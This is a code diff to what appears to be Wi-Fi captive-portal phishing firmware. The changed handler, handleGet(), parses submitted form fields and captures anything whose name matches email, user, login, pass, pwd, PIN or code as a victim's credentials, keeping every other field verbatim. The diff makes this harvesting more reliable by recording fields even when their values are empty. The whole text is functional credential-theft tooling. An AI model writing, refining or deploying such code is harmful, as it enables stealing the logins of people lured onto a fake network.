@@ -530,23 +530,26 @@ static void servePortal() {
 // anything else is kept verbatim in the extra column.
 static void handleGet() {
   String email, pass, extra;
+  bool   sawEmail = false, sawPass = false;  // a field was *seen*, even if empty
   for (uint8_t i = 0; i < server.args(); i++) {
     const String key   = server.argName(i);
     const String val   = server.arg(i);
     String       lower = key;
     lower.toLowerCase();
-    if (!email.length() && (lower.indexOf("email") >= 0 || lower.indexOf("user") >= 0 ||
-                            lower.indexOf("login") >= 0 || lower.indexOf("account") >= 0))
-      email = val;
-    else if (!pass.length() && (lower.indexOf("pass") >= 0 || lower.indexOf("pwd") >= 0 ||
-                                lower.indexOf("pin") >= 0 || lower.indexOf("code") >= 0))
-      pass = val;
-    else {
+    if (!sawEmail && (lower.indexOf("email") >= 0 || lower.indexOf("user") >= 0 ||
+                      lower.indexOf("login") >= 0 || lower.indexOf("account") >= 0)) {
+      email    = val;
+      sawEmail = true;
+    } else if (!sawPass && (lower.indexOf("pass") >= 0 || lower.indexOf("pwd") >= 0 ||
+                            lower.indexOf("pin") >= 0 || lower.indexOf("code") >= 0)) {
+      pass    = val;
+      sawPass = true;
+    } else {
       if (extra.length()) extra += "&";
       extra += key + "=" + val;
     }
   }
-  if (!email.length() && !pass.length() && extra.length()) {  // unknown shape: keep it all
+  if (!sawEmail && !sawPass && extra.length()) {  // unknown shape: keep it all
     email = extra;
     extra = "";
   }
